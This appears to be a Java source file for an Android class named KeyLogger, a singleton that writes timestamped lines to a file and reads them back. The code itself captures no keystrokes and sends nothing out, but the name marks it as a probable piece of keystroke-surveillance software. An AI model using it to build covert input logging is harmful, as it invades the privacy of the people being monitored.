package app.android.logger;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;

public class KeyLogger {

    private static KeyLogger instance = null;

    public static KeyLogger getInstance() {
        if (instance == null) {
            instance = new KeyLogger();
        }
        return instance;
    }

    private String path = null;

    public void append(String line) {
        try {
            FileOutputStream fos = new FileOutputStream(new File(this.path), true);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            DateFormat df = new SimpleDateFormat("HH:mm:ss", Locale.US);
            String time = df.format(Calendar.getInstance().getTime());
            writer.append(time + " : " + line + "\n");
            writer.close();
            fos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String toString() {
        String output = "";

        try {
            File keylogger_file = new File(this.path);
            StringBuilder sb = new StringBuilder();
            FileInputStream is = new FileInputStream( keylogger_file);
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));

            String line = null;
            Boolean firstLine = true;
            while ((line = reader.readLine()) != null) {
                if (firstLine) {
                    sb.append(line);
                    firstLine = false;
                } else {
                    sb.append("\n").append(line);
                }
            }
            reader.close();
            output = sb.toString();
        } catch (Exception ex) {
            output = ex.toString();
        }
        return output;
    }


    public void setRoot(String path) {
        this.path = path;
        File outfile = new File(this.path);
        try {
            if (!outfile.exists()) {
                outfile.createNewFile();
            }
        } catch (Exception ex) {

        }
    }

    private KeyLogger() {

    }
}
